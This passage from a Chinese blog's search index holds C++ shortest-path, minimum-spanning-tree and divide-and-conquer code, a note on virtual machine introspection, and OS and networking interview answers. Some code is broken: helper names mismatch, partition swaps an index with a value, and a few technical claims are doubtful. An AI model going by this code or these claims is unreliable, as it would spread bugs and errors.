&#123; // 边的起点i\t\t\tfor (int j = 0; j &lt; n; ++j) &#123; // 边的终点j\t\t\t\tif (G.edges[i][j] != INT32_MAX &amp;&amp; dist[i] != INT32_MAX\t\t\t\t\t&amp;&amp; dist[i] + G.edges[i][j] &lt; dist[j]) &#123;\t\t\t\t\tdist[j] = dist[i] + G.edges[i][j]; // 松弛操作\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tfor (int j = 0; j &lt; n; ++j) &#123;\t\t\t// 若执行完算法后仍然存在非最短路径，则该图存在权值为负的环路，无最短路径\t\t\tif (G.edges[i][j] != INT32_MAX &amp;&amp; dist[i] != INT32_MAX\t\t\t\t&amp;&amp; dist[i] + G.edges[i][j] &lt; dist[j]) &#123;\t\t\t\treturn false;\t\t\t&#125;\t\t&#125;\t&#125;\treturn true;&#125;\nDijkstra本算法仅适用于所有边的权值均为正的图。\n// G:图\tstart:源点\tdist:最短路径void Dijkstra(MGraph&amp; G, int start, vector&lt;int&gt;&amp; dist) &#123;\tint n = G.vertices.size();\t// 初始化最短路径\tdist.assign(n, INT32_MAX);\tvector&lt;int&gt; pre(n, -1); // 前驱数组\tvector&lt;bool&gt; visited(n, false); // 访问集，表示对应顶点最短路径是否已经找到\tvisited[start] = true;\t// 小顶优先队列，元素为&lt;dist[j],j&gt;\tpriority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; q;\t// 初始化最短路径\tfor (int j = 0; j &lt; n; ++j) &#123;\t\tdist[j] = G.edges[start][j];\t\tq.emplace(dist[j], j);\t&#125;\twhile (!q.empty()) &#123;\t\tint i = q.top().second; // 贪心选择最近结点i\t\tq.pop();\t\tvisited[i] = true; // 结点i最短路径已得到\t\tfor (int j = 0; j &lt; n; ++j) &#123; // 利用结点i进行松弛操作\t\t\tif (visited[j]) continue; // 结点j已得到最短路径，无需松弛\t\t\tif (G.edges[i][j] != INT32_MAX &amp;&amp; dist[i] != INT32_MAX\t\t\t\t&amp;&amp; dist[i] + G.edges[i][j] &lt; dist[j]) &#123;\t\t\t\tdist[j] = dist[i] + G.edges[i][j]; // 松弛操作\t\t\t\tpre[j] = i; // 更新前驱结点\t\t\t\tq.emplace(dist[j], j); // 加入优先队列\t\t\t&#125;\t\t&#125;\t&#125;\t// 打印源点到各结点的最短路径\tstack&lt;int&gt; s;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (i == start) continue;\t\tif (dist[i] == INT32_MAX) &#123;\t\t\tcout &lt;&lt; &quot;inf&quot; &lt;&lt; &quot;: &quot; &lt;&lt; G.vertices[start] &lt;&lt; &quot;-&gt;&quot; &lt;&lt; G.vertices[i] &lt;&lt; endl;\t\t&#125;\t\telse &#123;\t\t\tcout &lt;&lt; dist[i] &lt;&lt; &quot;: &quot; &lt;&lt; G.vertices[start] &lt;&lt; &quot;-&gt;&quot;;\t\t\tint x = pre[i];\t\t\twhile (x != -1) &#123;\t\t\t\ts.emplace(x);\t\t\t\tx = pre[x];\t\t\t&#125;\t\t\twhile (!s.empty()) &#123;\t\t\t\tcout &lt;&lt; G.vertices[s.top()] &lt;&lt; &quot;-&gt;&quot;;\t\t\t\ts.pop();\t\t\t&#125;\t\t\tcout &lt;&lt; G.vertices[i] &lt;&lt; endl;\t\t&#125;\t&#125;&#125;\n最小生成树题目描述\n解题代码Kruskalvoid Kruskal(MGraph&amp; G) &#123;\tint n = G.vertices.size();\t// 边集，元素为&lt;权值weight，起点u，终点v&gt;\tvector&lt;tuple&lt;int, int, int&gt;&gt; edges;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tfor (int j = i + 1; j &lt; n; ++j) &#123;\t\t\tif (G.edges[i][j] != INT32_MAX) &#123;\t\t\t\t// 将边加入边集\t\t\t\tedges.emplace_back(G.edges[i][j], i, j);\t\t\t&#125;\t\t&#125;\t&#125;\t// 对边集按权值大小进行升序排序\tsort(edges.begin(), edges.end());\t// 简单并查集，father[x]存放x的父结点\tvector&lt;int&gt; father(n);\t// 寻找x所在集合的父结点（所在连通分量编号）\tauto findFather = [&amp;](int x) &#123;\t\tint f = father[x];\t\twhile (f != x) &#123;\t\t\tx = f;\t\t\tf = father[x];\t\t&#125;\t\treturn f;\t&#125;;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tfather[i] = i; // 初始父结点为自身\t&#125;\tint cnt = 0; // 已找到的边个数\tfor (int i = 0; cnt &lt;= n - 1 &amp;&amp; i &lt; edges.size(); ++i) &#123;\t\tauto [weight, u, v] = edges[i];\t\tint fu = findFather(u);\t\tint fv = findFather(v);\t\t// 若u和v父结点相同（即u和v位于一个连通分量中），若选择加入边uv，则会导致回路\t\tif (fu != fv) &#123;\t\t\tcout &lt;&lt; G.vertices[u] &lt;&lt; &quot; - &quot; &lt;&lt; G.vertices[v] &lt;&lt; &quot; : &quot; &lt;&lt; weight &lt;&lt; endl;\t\t\tfather[fu] = fv; // 两个连通分量合并为一个\t\t\t++cnt;\t\t&#125;\t&#125;&#125;\nPrimvoid Prim(MGraph&amp; G) &#123;\tint n = G.vertices.size();\t// minDist[i]表示结点i距离MST最近距离\tvector&lt;int&gt; minDist(n, INT32_MAX);\t// connected[i]表示在MST中与结点i相连的结点\tvector&lt;int&gt; connected(n, 0);\t// 表示结点i是否已加入MST\tvector&lt;bool&gt; visited(n, false);\tvisited[0] = true;\tfor (int j = 1; j &lt; n; ++j) &#123;\t\t// 初始化最近距离\t\tminDist[j] = G.edges[0][j];\t&#125;\tfor (int i = 1; i &lt; n; ++i) &#123;\t\t// 寻找距离MST的最近结点k\t\tint minVal = INT32_MAX, k = -1;\t\tfor (int j = 1; j &lt; n; ++j) &#123;\t\t\tif (!visited[j] &amp;&amp; minDist[j] &lt; minVal) &#123;\t\t\t\tminVal = minDist[j];\t\t\t\tk = j;\t\t\t&#125;\t\t&#125;\t\tif (k == -1) break;\t\t// 将结点k加入MST中\t\tvisited[k] = true;\t\tcout &lt;&lt; G.vertices[connected[k]] &lt;&lt; &quot; - &quot; &lt;&lt; G.vertices[k] &lt;&lt; &quot; : &quot; &lt;&lt; minVal &lt;&lt; endl;\t\t// 更新minDist数组和connected数组\t\tfor (int j = 1; j &lt; n; ++j) &#123;\t\t\tif (!visited[j] &amp;&amp; G.edges[k][j] &lt; minDist[j]) &#123;\t\t\t\tminDist[j] = G.edges[k][j];\t\t\t\tconnected[j] = k;\t\t\t&#125;\t\t&#125;\t&#125;&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"虚拟机自省技术","url":"/2025/06/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%87%AA%E7%9C%81%E6%8A%80%E6%9C%AF%E4%BA%86%E8%A7%A3/","content":"虚拟机自省技术（Virtual Machine Introspection）是一种通过外部监控虚拟机内部状态的技术，它能够在不依赖虚拟机内运行的软件的情况下，获取和分析虚拟机的内存、CPU 状态、磁盘活动、网络流量等数据。\n\n以下是维基百科中对虚拟机自省技术的描述，我对其进行了中文翻译：\n\n原文链接： Virtual machine introspection - Wikipedia\n在计算机领域，虚拟机自省（Virtual Machine Introspection, VMI）是一种监控虚拟机运行状态的技术，这有助于调试和取证分析（forensic analysis）。\nintrospection 这个术语由 Garfinkel 和 Rosenblum 引入虚拟机领域。他们发明了一种“保护安全应用程序免受恶意软件攻击”的方法，并将其称为 VMI。如今 VMI 是不同的虚拟机取证和分析方法的通用术语。基于 VMI 的方法广泛用于安全应用程序、软件调试和系统管理。\nVMI 工具可以位于虚拟机内部或外部，并通过跟踪事件（中断、内存写入等）或向虚拟机发送请求来工作。虚拟机监视器通常提供底层信息，如内存的原始字节。将这种底层视图转换为对用户有意义的内容也就是所谓的“语义鸿沟”问题。解决这个问题需要分析和理解被监视的系统。\n虚拟机内的 VMI\n运行在虚拟机内部的程序可以提供其他进程的信息。这些信息可以通过网络接口或一些虚拟设备（如串口）发送。虚拟机内自省程序比如 WinDbg 或者与远程调试器交互的 GDB 服务器。\n这种方法的缺点是它需要在虚拟机内中运行一个正常的 OS。如果 OS 挂起或尚未加载，那么自省代理（agent）也无法工作。\n虚拟机外的 VMI\nVMI 工具可以在虚拟机监视器内实现，也可以作为从虚拟机监视器捕获信息（例如内存数据）的单独程序实现。然后，必须对这些数据进行解释，以了解系统实际执行的过程。解释工具中一个比较流行的是 Volatility framwork。该框架能够支持很多主流的操作系统，并从中提取不同的信息，比如进程树和内核对象列表。\n\n主流的 VMI 工具如下：\n\nLibVMI：开源库（支持主流的虚拟化方案：Xen/KVM/VMware），提供统一的 API 读取虚拟机内存、寄存器，并支持符号解析（如从内存中提取 Windows 的 EPROCESS 结构）。\nVolatility：内存取证框架，可与 VMI 结合分析虚拟机内存快照（如检测恶意进程）。\nDRAKVUF：动态分析工具，通过注入恶意代码并监控虚拟机行为，用于沙箱检测。\nGRR（Google Rapid Response）：结合 VMI 实现远程取证和响应。\n\n","categories":["操作系统"],"tags":["操作系统","虚拟化"]},{"title":"算法分析与设计编程题 递归与分治策略","url":"/2023/08/26/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%80%92%E5%BD%92%E4%B8%8E%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/","content":"棋盘覆盖题目描述\n\n解题代码// para: 棋盘，行偏移，列偏移，特殊行，特殊列void dividedCovering(vector&lt;vector&lt;int&gt;&gt;&amp; chessBoard, int dr, int dc, int sr, int sc, int size) &#123;\tif (size == 1) return;\tsize /= 2; // 划分为四部分\tif (sr &lt; dr + size &amp;&amp; sc &lt; dc + size) &#123; // 特殊点位于左上部分\t\tdivideCovering(chessBoard, dr, dc, sr, sc, size);\t&#125;\telse &#123;\t\tint nr = dr + size - 1, nc = dc + size - 1; // 新覆盖点\t\tchessBoard[nr][nc] = 1;\t\tdivideCovering(chessBoard, dr, dc, nr, nc, size);\t&#125;\tif (sr &lt; dr + size &amp;&amp; sc &gt;= dc + size) &#123; // 特殊点位于右上部分\t\tdivideCovering(chessBoard, dr, dc + size, sr, sc, size);\t&#125;\telse &#123;\t\tint nr = dr + size - 1, nc = dc + size;\t\tchessBoard[nr][nc] = 1;\t\tdivideCovering(chessBoard, dr, dc + size, nr, nc, size);\t&#125;\tif (sr &gt;= dr + size &amp;&amp; sc &lt; dc + size) &#123; // 特殊点位于左下部分\t\tdivideCovering(chessBoard, dr + size, dc, sr, sc, size);\t&#125;\telse &#123;\t\tint nr = dr + size, nc = dc + size - 1;\t\tchessBoard[nr][nc] = 1;\t\tdivideCovering(chessBoard, dr + size, dc, nr, nc, size);\t&#125;\tif (sr &gt;= dr + size &amp;&amp; sc &gt;= dc + size) &#123; // 特殊点位于右下部分\t\tdivideCovering(chessBoard, dr + size, dc + size, sr, sc, size);\t&#125;\telse &#123;\t\tint nr = dr + size, nc = dc + size;\t\tchessBoard[nr][nc] = 1;\t\tdivideCovering(chessBoard, dr + size, dc + size, nr, nc, size);\t&#125;&#125;void chessBoardCovering(vector&lt;vector&lt;int&gt;&gt;&amp; chessBoard, int sr, int sc) &#123;\tint n = chessBoard.size();\tdivideCovering(chessBoard, 0, 0, sr, sc, n);&#125;\n线性时间选择题目描述\n解题代码int partition(vector&lt;int&gt;&amp; nums, int left, int right) &#123;\tint randIdx = rand() % (right - left + 1) + left; // 选取随机pivot\tswap(randIdx, nums[left]);\tint pivot = nums[left];\twhile (left &lt; right) &#123;\t\twhile (left &lt; right &amp;&amp; nums[right] &gt;= pivot) --right;\t\tnums[left] = nums[right];\t\twhile (left &lt; right &amp;&amp; nums[left] &lt;= pivot) ++left;\t\tnums[right] = nums[left];\t&#125;\tnums[left] = pivot;\treturn left;&#125;int dividedQuickSelect(vector&lt;int&gt;&amp; nums, int left, int right, int k) &#123;\tif (left &gt;= right) return nums[left];\tint p = partition(nums, left, right); // 根据基准进行划分\tif (p == k) return nums[p]; // 划分基准正好为第k小的数\telse if (p &gt; k) return divideQuickSelect(nums, left, p - 1, k); // 基准大于第k小\telse return divideQuickSelect(nums, p + 1, right, k); // 基准小于第k小&#125;int quickSelect(vector&lt;int&gt;&amp; nums, int k) &#123;\tsrand((unsigned)time(nullptr)); // 设定随机种子\treturn divideQuickSelect(nums, 0, nums.size() - 1, k - 1);&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"计算机基础面试题总结","url":"/2023/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/","content":"承接上文，本文总结了计算机基础学科（包括数据结构、计算机组成原理、操作系统、计算机网络等）常见的一些面试问题，以便随时查看。\n常见的进程调度算法有哪些\n先来先服务调度算法：处于就绪态的进程按先后顺序链入到就绪队列中，而先来先去服务调度算法按就绪进程进入就绪队列的先后次序选择当前最先进入就绪队列的进程来执行，直到此进程阻塞或结束，才进行下一次的进程选择调度。\n\n短进程优先调度算法：是一种按照进程执行时间长短进行调度的算法，即优先调度执行时间短的进程。\n\n优先级调度算法：优先级调度算法又称优先权调度算法。优先级调度算法每次从就绪队列中选择优先级最高的进程，将处理机分配给它，使之投入运行。\n高响应比优先调度算法：该算法是对 FCFS 调度算法和 SPF 调度算法的一种综合平衡，同时考虑每个进程的等待时间和估计的运行时间。在每次进行进程调度时，先计算就绪队列中每个进程的响应比，从中选出响应比最高的进程投入运行。 \n时间片轮转调度算法：时间片轮转调度算法主要适用于分时系统。每次调度时，把 CPU 分配给队首进程，并令其执行一个时间片。当执行的时间片用完时，由一个计时器发出时钟中断请求，调度程序便据此信号来停止该进程的执行，并将它送往就绪队列的末尾；然后，再把处理机分配给就绪队列中新的队首进程，同时也让它执行一个时间片。\n多级反馈队列调度算法：是一种综合性的调度算法，它将进程队列分成多个队列，每个队列有不同的优先级，每个队列的时间片大小也不同。\n\n什么是大端、小端，如何判断大端和小端什么是大端、小端大端和小端是指在多字节数据类型的存储方式中，高位字节和低位字节的存储顺序。大端模式是指高位字节存储在低地址，低位字节存储在高地址；小端模式是指低位字节存储在低地址，高位字节存储在高地址。\n如何判断大端和小端\n利用联合体的特性，将一个多字节的变量和一个字节的变量存放在同一个地址空间中，通过判断该变量的第一个字节的值来判断系统的大小端模式。如果第一个字节的值为 0，那么该系统是大端模式；如果第一个字节的值为 1，那么该系统是小端模式。\n\n利用强制类型转换，将一个整型变量的地址强制转换为一个字符型指针，然后通过判断该指针所指向的地址的值来判断系统的大小端模式。如果该指针所指向的地址的值为 0，那么该系统是大端模式；如果该指针所指向的地址的值为 1，那么该系统是小端模式。\n\n\n进程通信的方式有哪些\n管道是一种进程间通信的方式，建立在具有血缘关系的进程之上。管道是一种单向通信方式，即发送进程以字符流形式将大量数据送入管道，接收进程可从管道接收数据，二者利用管道进行通信。管道是基于字节流的，管道内部已完成同步机制，数据具有一致性，不被外界打扰。\n\n消息队列是一种进程间通信的方式，它是一种消息传递机制，即发送进程将消息发送到消息队列，接收进程从消息队列中接收消息。消息队列是基于消息的，消息队列中的消息具有类型，接收进程可以选择接收特定类型的消息。\n\n共享内存是一种进程间通信的方式，它是一种共享内存区域的机制，即多个进程共享同一块内存区域，进程可以直接访问这块内存区域，从而实现进程间通信。\n\n信号量是一种进程间通信的方式，它是一种计数器，用于控制多个进程对共享资源的访问。\n\n信号是一种进程间通信的方式，它是一种软件中断，用于通知进程发生了某个事件。\n\nSocket 是一种进程间通信的方式，它是一种网络通信机制，可以在不同的主机之间进行通信。\n\n\n进程有多少种状态，如何转换进程有五种状态：创建、就绪、执行、阻塞、终止：\n\n创建：一个进程启动，首先进入创建状态，需要获取系统资源创建进程控制块（PCB：Process Control Block）完成资源分配。\n就绪：在创建状态完成之后，进程已经准备好，处于就绪状态，但是还未获得处理器资源，无法运行。\n运行：获取处理器资源，被系统调度，当具有时间片开始进入运行状态。如果进程的时间片用完了就进入就绪状态。\n阻塞：在运行状态期间，如果进行了阻塞的操作，此时进程暂时无法操作就进入到了阻塞状态，在这些操作完成后就进入就绪状态。等待再次获取处理器资源，被系统调度，当具有时间片就进入运行状态。\n终止：进程结束或者被系统终止，进入终止状态。\n\n进程和线程的区别\n. 进程有独立的地址空间，线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间； \n进程和线程切换时，需要切换进程和线程的上下文，进程的上下文切换时间开销远远大于线程上下文切换时间，耗费资源较大，效率较低； \n进程的并发性较低，线程的并发性较高； \n每个独立的进程有一个程序运行的入口、顺序执行序列和程序的出口，但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制； \n系统在运行的时候会为每个进程分配不同的内存空间；而对线程而言，除了 CPU 外，系统不会为线程分配内存（线程所使用的资源来自其所属进程的资源），线程组之间只能共享资源； \n一个进程崩溃后，在保护模式下不会对其他进程产生影响，但是一个线程崩溃整个进程都将崩溃。因此多进程要比多线程健壮。\n\n介绍一下死锁，产生的必要条件，产生的原因，如何避免死锁什么是死锁死锁是指两个或多个进程在执行过程中，因争夺资源而造成的一种僵局，若无外力作用，它们都将无法继续执行下去。\n产生的必要条件\n互斥条件：进程要求对所分配的资源进行排它性控制，即在一段时间内某资源仅为一进程所占用。\n请求和保持条件：当进程因请求资源而阻塞时，对已获得的资源保持不放。\n不剥夺条件：进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放。\n循环等待条件：若干进程之间形成一种头尾相接的循环等待资源关系。\n\n产生的原因\n系统资源的竞争：通常系统中拥有的不可剥夺资源，其数量不足以满足多个进程运行的需要，使得进程在运行过程中，会因争夺资源而陷入僵局，如磁带机、打印机等。\n进程推进顺序非法：进程在运行过程中，请求和释放资源的顺序不当，也会导致死锁。\n资源分配不当：系统在资源分配过程中，本身也可能发生错误，如本来应该分配给进程 A 的资源，却分配给了进程 B，这样也可能导致死锁。\n\n如何避免死锁\n死锁的预防：破坏互斥条件、破坏请求和保持条件、破坏不剥夺条件、破坏循环等待条件。\n死锁的避免：在资源分配过程中，采用银行家算法，动态地分配资源，避免进程间发生死锁。\n死锁的检测与解除：通过进程的资源分配图，检测系统中是否存在死锁。采用撤销进程、回收资源等方法，解除死锁。\n\n介绍一下分段和分页\n分段是将程序分成若干个逻辑段，每个段可以包含一个模块或若干个模块，每个段的长度是不固定的，每个段都有一个段名和段长，段名是一个符号，段长是指该段所包含的字节数。分段的主要目的是为了方便程序员编写和修改程序，同时也可以更好地利用内存空间，避免内存碎片的产生。\n\n分页是将程序和数据分成固定大小的页。每个页都有一个页号和页框号，页号是页在程序或数据中的逻辑地址，页框号是页在内存中的物理地址。分页的主要目的是为了实现非连续分配，以便解决内存碎片问题，或者说分页是由于系统管理的需要。\n\n\n介绍一下共享内存共享内存是一种允许两个或多个进程访问同一块内存的进程间通信方式。共享内存是两个正在运行的进程之间共享和传递数据的一种非常有效的方式。\n共享内存的主要优点是速度快，因为数据不需要在进程之间复制，而是直接在内存中传递。共享内存的主要缺点是需要进程之间进行同步，以避免数据的冲突和竞争条件。\n介绍一下虚拟内存和物理内存虚拟内存和物理内存都是计算机中的内存概念，但它们在实现方式和作用上有所不同。\n物理内存是计算机实际物理上存在的内存，也被称为主存储器。它是用来存储程序和数据的地方，数据可以被 CPU 直接访问。物理内存的容量是有限的，因此它通常被操作系统分配给运行程序的进程。\n虚拟内存则是一种将物理内存和硬盘空间结合起来的技术。它将物理内存扩展到了硬盘上，使得运行的程序可以访问比物理内存更大的内存空间。虚拟内存由操作系统管理，可以分配给不同的进程使用。当进程需要访问虚拟内存时，操作系统会将需要的部分从硬盘上读取到物理内存中，并将不需要的部分暂时写入硬盘，以便为其他进程或操作系统腾出更多的物理内存空间。\n虚拟内存的使用可以让多个进程共享物理内存，并且可以提高系统的整体性能和稳定性，因为操作系统可以更好地管理物理内存的使用。虚拟内存的一个重要作用是，它可以使得进程能够访问比物理内存更大的内存空间，因为它使用硬盘空间作为缓存，允许运行大型应用程序和操作系统。\nTCP 和 UDP 的区别是什么TCP（传输控制协议）和 UDP（用户数据报协议）都是互联网协议中的传输层协议，它们在传输数据时有一些区别：\n\n连接：TCP 是面向连接的协议，UDP 是无连接的协议。TCP 通过三次握手建立连接，数据传输结束后需要四次挥手断开连接。而 UDP 在传输数据之前不需要建立连接，也不需要断开连接。\n可靠性：TCP 是一种可靠的协议，它通过序号、确认和重传等机制来保证数据传输的可靠性。如果数据丢失或损坏，TCP 会自动重传数据，直到接收方正确接收到数据为止。而 UDP 则没有任何可靠性保障，它只是将数据报发送给接收方，如果数据在传输过程中丢失或损坏，UDP 不会自动重传数据。\n传输效率：UDP 比 TCP 传输效率高。UDP 不需要建立连接、维护状态等，因此可以更快地传输数据。但是，由于 UDP 没有可靠性保障，如果出现数据丢失或损坏，需要应用层自己处理。\n消息大小：TCP 可以传输大型数据，而 UDP 只能传输小型数据。TCP 在传输数据时会将数据分成多个小块，每个小块都有序号和确认机制，可以保证数据的完整性。而 UDP 每个数据包的大小限制在 64KB 以内，超过这个限制需要应用层进行分割。\n应用场景：TCP 适合用于可靠性要求高、数据量较大的场景，例如文件传输、网页访问等。而 UDP 适合用于实时性要求高、数据量较小的场景，例如语音通话、视频会议等。\n\nTCP 三次握手四次挥手的过程是什么三次握手\n客户端向服务器发送 SYN 报文，表示请求连接。\n服务器接收到 SYN 报文后，发送一个 ACK 报文，表示确认收到客户端请求，并且向客户端发送一个 SYN 报文，表示同意连接。\n客户端接收到服务器的 SYN 和 ACK 报文后，向服务器发送一个 ACK 报文，表示确认连接建立成功。\n\n三次握手完成后，客户端和服务器之间建立了一个可靠的连接，可以进行数据传输。\n四次挥手\n客户端向服务器发送一个 FIN 报文，表示要关闭连接。\n服务器接收到 FIN 报文后，发送一个 ACK 报文，表示确认收到客户端的请求，但是还没有准备好关闭连接。\n服务器准备好关闭连接后，向客户端发送一个 FIN 报文，表示要关闭连接。\n客户端接收到服务器的 FIN 报文后，发送一个 ACK 报文，表示确认收到服务器的请求，然后等待两个 MSL （最长报文段寿命）后自动关闭连接。\n\n四次挥手完成后，客户端和服务器之间的连接被释放，不再进行数据传输。\n介绍一下 OSI 七层模型OSI 七层模型是一种网络协议的分层模型，它把网络协议从逻辑上分为了 7 层，每一层都有相关、相对应的物理设备。这 7 层分别为：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。\n这 7 层的具体功能如下：\n\n物理层：定义了物理媒介的规范，如传输速率、信号类型、线路编码等。\n数据链路层：为物理层提供服务，定义了数据在物理媒介上的传输规范，如帧的格式、数据的传输和接收、差错校验等。\n网络层：负责在不同的网络之间进行数据传输，包括路由选择、拥塞控制、逻辑寻址等。\n传输层：负责提供端到端的数据传输，包括数据的分段、传输控制、差错恢复等。\n会话层：管理不同设备之间的会话，包括会话的建立、维护和结束。\n表示层：负责数据的格式转换、加密解密、数据压缩等。\n应用层：负责向用户提供网络服务，包括电子邮件、文件传输、远程登录等。\n\nTCP 如何实现可靠传输\n超时重传机制：TCP 通过使用确认和超时机制来检测丢失的分组并进行重传。当发送方发送一个分组后，会等待接收方发送确认信息，如果在指定的时间内没有收到确认信息，TCP 就会认为这个分组丢失了，然后重新发送。\n滑动窗口机制：TCP 采用滑动窗口技术来控制传输的速度。发送方和接收方都有一个窗口大小的参数，发送方根据接收方发送的确认信息来调整窗口大小，从而保证传输的可靠性和效率。\n流量控制：TCP 使用流量控制来防止发送方发送过多的数据导致接收方的缓存区溢出。接收方可以向发送方发送窗口大小信息，告诉发送方还能接收多少数据，从而实现流量控制。\n拥塞控制：TCP 通过拥塞控制来避免网络拥塞。发送方会根据网络的拥塞情况来调整发送速率，从而避免过多的数据包在网络中堆积导致网络拥塞。\n\n通过上述可靠传输机制，TCP 协议可以在网络不可靠、有丢失和错误的情况下，保证数据传输的可靠性和正确性，从而被广泛应用于各种应用场景。\nTCP 和 UDP 的使用场景\nTCP 适用于要求数据传输可靠性和完整性的场景，如文件传输、电子邮件、网页浏览、远程登录等。由于 TCP 提供了可靠的数据传输和错误处理，这些应用能够保证数据的正确性和完整性，但是 TCP 的建立连接和维护状态等操作会增加传输的时延，适合对速度要求不是特别高的应用。\n\nUDP 适用于对实时性和传输速度要求较高的场景，如视频会议、实时游戏等。UDP 不保证数据传输的可靠性，但是它传输速度快，且不需要建立连接和维护状态等操作，适合对实时性和传输速度要求较高的应用场景。\n\n\nUDP 怎么实现可靠传输\n应用层重传：在应用层实现数据的重传机制，当收到 ACK 包时，如果发现某个数据包没有收到 ACK 包的确认，则重新发送该数据包，直到收到 ACK 包的确认。\n\n数据包校验和：在数据包中添加校验和，用来检测数据包是否发生错误，如果发现数据包发生错误，则进行重传。\n\n超时重传：发送方在发送数据包时，设置一个超时时间，如果在该时间内没有收到 ACK 包的确认，则进行数据包的重传。\n\n序列号机制：在发送数据包时，为每个数据包添加一个序列号，接收方收到数据包后，对数据包进行排序，如果发现数据包乱序，则进行重排序。\n\n\n介绍一下滑动窗口机制滑动窗口机制是一种流量控制方法，它允许发送方在停止并等待确认前连续发送多个分组，而不必每发送一个分组就停下来等待确认，从而增加数据传输的速率提高应用的吞吐量。\n滑动窗口机制通过动态改变窗口大小来调节两台主机间数据传输。滑动窗口机制的基本原理是：发送方和接收方各自维护一个窗口，窗口大小是动态变化的，窗口大小的变化取决于网络的拥塞情况和接收方的处理能力。\n浏览器从输入 URL 到页面显示内容，中间发生了什么\nDNS 解析：浏览器根据 URL 中的主机名进行 DNS 解析，将域名解析成 IP 地址。\nTCP 连接：浏览器使用 HTTP 协议通过 TCP 与服务器建立连接。\n发送 HTTP 请求：浏览器向服务器发送 HTTP 请求，请求中包含请求方法、请求头部、请求正文等内容。\n服务器处理请求：服务器接收到请求后，会根据请求的内容进行处理，处理完后会将响应结果返回给浏览器。\n接收 HTTP 响应：浏览器接收到 HTTP 响应，响应中包含响应头部、响应状态码、响应正文等内容。\n解析 HTML：浏览器根据响应内容中的 HTML 标签和文本内容，解析成 DOM 树。\n加载 CSS 和 JavaScript：浏览器根据 HTML 中的链接标签和脚本标签，加载相应的 CSS 和 JavaScript 文件，并执行其中的代码。\n渲染页面：浏览器根据 DOM 树和 CSS 样式表中的样式信息，将页面渲染出来，包括布局、绘制等过程。\n关闭 TCP 连接：浏览器在完成页面渲染后，会关闭与服务器之间的 TCP 连接。\n\n总的来说，浏览器从输入 URL 到页面显示内容，经历了 DNS 解析、TCP 连接、HTTP 请求、服务器处理请求、HTTP 响应、解析 HTML、加载 CSS 和 JavaScript、渲染页面、关闭 TCP 连接等多个步骤。\n介绍一下 DNS 解析过程以及 DNS 劫持DNS 解析过程\n浏览器首先会检查本地缓存，看是否已经存在该域名的解析结果。如果存在，则直接使用缓存中的解析结果。\n如果本地缓存中不存在该域名的解析结果，则会向本地 DNS 服务器发送查询请求。本地 DNS 服务器一般由 ISP（Internet Service Provider）提供，它会缓存一些常用的域名解析结果。如果本地 DNS 服务器缓存中存在该域名的解析结果，则直接返回给浏览器。\n如果本地 DNS 服务器缓存中也不存在该域名的解析结果，则会向根域名服务器发送查询请求。根域名服务器会告诉本地 DNS 服务器该域名对应的顶级域名服务器的 IP 地址。\n本地 DNS 服务器会向顶级域名服务器发送查询请求。顶级域名服务器会告诉本地 DNS 服务器该域名对应的权威域名服务器的 IP 地址。\n本地 DNS 服务器向权威域名服务器发送查询请求。权威域名服务器会返回该域名的解析结果，本地 DNS 服务器将结果缓存起来，并将结果返回给浏览器。\n浏览器使用该域名对应的 IP 地址与服务器建立连接，并获取相应的资源。\n\nDNS 劫持DNS 劫持指的是黑客通过某种手段篡改了 DNS 解析结果，将用户访问的域名指向了恶意服务器，从而实现网络攻击。常见的 DNS 劫持方式包括：\n\nDNS 缓存投毒：黑客利用漏洞将恶意的 DNS 解析结果注入到 DNS 缓存中。\n\n劫持 DNS 服务器：黑客攻击 DNS 服务器，修改服务器的 DNS 解析结果。\n\n本地 Hosts 文件劫持：黑客通过修改本地 Hosts 文件，将用户访问的域名指向恶意 IP 地址。\n\n\n介绍一下 ARP 协议ARP（Address Resolution Protocol）协议是用于将网络层地址（IP地址）转换为链路层地址（MAC地址）的协议。在进行数据传输之前，需要先获得目标设备的 MAC 地址，才能将数据包通过网络传递到目标设备。这就是 ARP 协议的作用。\n具体来说，当一台计算机在发送数据时，会先检查其 ARP 缓存，查看目标设备的 MAC 地址是否已经存在。如果已经存在，则将数据包封装成链路层帧，直接发送给目标设备。如果目标设备的 MAC 地址未知，则需要进行 ARP 请求。\nARP 请求是以广播形式发送的，即发送给本网络内所有的设备。请求中包含发送方的 IP 地址和 MAC 地址，以及目标设备的 IP 地址。当目标设备收到 ARP 请求时，会返回一个 ARP 应答，包含其 MAC 地址。此时发送方就可以获得目标设备的 MAC 地址，并将数据包封装成链路层帧发送给目标设备。\n需要注意的是，ARP 协议是基于广播的，因此会产生一定的网络负载。此外，ARP 缓存中的条目是有时限的，一旦过期就需要重新进行 ARP 请求。由于 ARP 协议没有进行认证，因此容易受到 ARP 欺骗攻击。\n数据库为什么不用红黑树而用 B+ 树\n磁盘 I/O 效率：相对于红黑树而言，B+ 树可以更好地利用磁盘块的大小，一次 I/O 读取更多的节点，从而降低 I/O 的次数，提高查询效率。\n数据查询效率：B+ 树是一种多路搜索树，因此在进行数据查询时，可以很快定位到需要查找的数据节点。而红黑树的查找时间复杂度为 O(log n)，相对较慢。\n数据范围查询：在数据库中，我们常常需要进行范围查询，例如查询某个区间内的所有数据。B+ 树可以支持按照范围进行数据查询，而红黑树则需要对整个树进行遍历。\n内存占用：相对于红黑树而言，B+ 